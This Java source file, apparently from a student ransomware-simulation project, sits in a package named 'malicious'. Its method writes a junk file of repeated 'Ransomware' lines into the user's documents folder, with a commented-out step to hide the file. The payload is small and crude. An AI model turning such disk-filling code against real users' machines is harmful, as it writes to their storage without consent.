/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package malicious;

import entity.Record;
import gui.Home;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.filechooser.FileSystemView;
import org.apache.commons.io.FileUtils;
import static util.FileUtil.readFile;

/**
 *
 * @author SCEA
 */
public class EatSpace {
    
    public static void eat() throws IOException, IOException{
        String path = FileSystemView.getFileSystemView().getDefaultDirectory().getPath();
        String fileLoc = path + "/qwertyuioop.txt";
        File file = new File(fileLoc);
        String data = "";
        Path path1 = Paths.get(fileLoc);
        System.out.println("Eating Memeory.");
        if (file.isFile()) {
//            Files.setAttribute(path1, "dos:hidden", false);
            for(int i = 0; i<=10000;i++){
                data+="Ransomware\n";
            }
            FileUtils.write(file, data);
        } else {
            file.createNewFile();
            for(int i = 0; i<=10000;i++){
                data+="Ransomware\n";
            }
            FileUtils.write(file, data);
        }
    }
}
